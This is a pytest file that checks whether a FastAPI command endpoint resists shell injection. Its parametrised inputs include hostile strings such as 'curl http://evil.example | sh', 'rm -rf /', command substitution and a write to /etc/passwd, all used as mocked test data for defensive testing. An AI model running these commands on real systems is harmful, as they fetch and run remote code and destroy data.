# MIT License
#
# Copyright (c) 2024 mhand
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""Pin the command-injection posture of the /api/v1/command web path.

Topic from bot PRs #631/#632/#640: can a web caller influence the shell
string (or keypress/url arguments) of an executed command, beyond selecting
a pre-configured command by name?

These tests prove the answer is NO with the current code:

- the endpoint passes only ``request.command`` (a name) to the executor;
- the executor looks that name up in config-defined ``model_actions`` and
  returns False (no-op) for anything not configured;
- the ``parameters`` field of the request body is never forwarded;
- shell actions execute via ``shlex.split`` + ``subprocess.run`` with an
  argv list and no ``shell=True``, so even config-sourced metacharacters
  are not interpreted by a shell.
"""

import shlex
import subprocess
from datetime import datetime
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from chatty_commander.app.command_executor import CommandExecutor
from chatty_commander.web.routes.core import include_core_routes

CONFIGURED_SHELL_CMD = "echo hello"


def _make_executor() -> CommandExecutor:
    """Real CommandExecutor over a minimal config, mirroring web_mode wiring."""
    config = SimpleNamespace(
        model_actions={
            "hello": {"action": "shell", "cmd": CONFIGURED_SHELL_CMD},
            "press": {"action": "keypress", "keys": "ctrl+alt+t"},
        }
    )
    return CommandExecutor(
        config=config, model_manager=MagicMock(), state_manager=MagicMock()
    )


@pytest.fixture()
def client() -> TestClient:
    executor = _make_executor()
    app = FastAPI()
    router = include_core_routes(
        get_start_time=lambda: 0.0,
        get_state_manager=lambda: MagicMock(),
        get_config_manager=lambda: MagicMock(),
        get_last_command=lambda: None,
        get_last_state_change=datetime.now,
        execute_command_fn=executor.execute_command,
    )
    app.include_router(router)
    return TestClient(app)


@pytest.mark.parametrize(
    "payload_name",
    [
        "hello; touch /tmp/pwned",
        "hello && curl http://evil.example",
        "$(touch /tmp/pwned)",
        "`id`",
        "../../bin/sh -c id",
        "rm -rf /",
        "hello | tee /etc/passwd",
    ],
)
def test_injection_shaped_command_names_are_noops(client, payload_name):
    """Arbitrary strings are not executed: name lookup fails, nothing runs."""
    with patch("chatty_commander.app.command_executor.subprocess.run") as mock_run:
        resp = client.post("/api/v1/command", json={"command": payload_name})

    assert resp.status_code == 200
    body = resp.json()
    assert body["success"] is False
    assert "no-op" in body["message"]
    mock_run.assert_not_called()


def test_parameters_field_cannot_alter_configured_shell_command(client):
    """The request 'parameters' dict is accepted but never reaches the executor."""
    completed = subprocess.CompletedProcess(
        args=shlex.split(CONFIGURED_SHELL_CMD), returncode=0, stdout="hello", stderr=""
    )
    with patch(
        "chatty_commander.app.command_executor.subprocess.run",
        return_value=completed,
    ) as mock_run:
        resp = client.post(
            "/api/v1/command",
            json={
                "command": "hello",
                "parameters": {
                    "cmd": "curl http://evil.example | sh",
                    "keys": "ctrl+alt+del",
                    "url": "http://evil.example",
                },
            },
        )

    assert resp.status_code == 200
    assert resp.json()["success"] is True
    mock_run.assert_called_once()
    args, kwargs = mock_run.call_args
    # Exactly the config-defined argv; nothing from the request body leaked in.
    assert args[0] == shlex.split(CONFIGURED_SHELL_CMD)
    assert kwargs.get("shell") is not True


def test_extra_request_body_fields_are_rejected(client):
    """CommandRequest forbids extra fields, closing smuggling via the body."""
    resp = client.post(
        "/api/v1/command",
        json={"command": "hello", "shell": "rm -rf /", "cmd": "id"},
    )
    assert resp.status_code == 422


def test_keypress_args_come_only_from_config(client):
    """Keypress actions use config-defined keys, never request input."""
    with patch("chatty_commander.app.command_executor.pyautogui") as mock_pg:
        resp = client.post(
            "/api/v1/command",
            json={"command": "press", "parameters": {"keys": "ctrl+alt+del"}},
        )
    assert resp.status_code == 200
    assert resp.json()["success"] is True
    mock_pg.hotkey.assert_called_once_with("ctrl", "alt", "t")


def test_shell_action_executes_without_shell_interpretation():
    """Even config-sourced metacharacters get argv semantics, not shell ones."""
    config = SimpleNamespace(
        model_actions={"meta": {"action": "shell", "cmd": "echo hi; touch pwned"}}
    )
    executor = CommandExecutor(
        config=config, model_manager=MagicMock(), state_manager=MagicMock()
    )
    completed = subprocess.CompletedProcess(args=[], returncode=0, stdout="", stderr="")
    with patch(
        "chatty_commander.app.command_executor.subprocess.run",
        return_value=completed,
    ) as mock_run:
        assert executor.execute_command("meta") is True

    args, kwargs = mock_run.call_args
    # Passed as an argv list (shlex.split), so ';' is a literal argument...
    assert args[0] == ["echo", "hi;", "touch", "pwned"]
    # ...and no shell is involved to reinterpret it.
    assert kwargs.get("shell") is not True
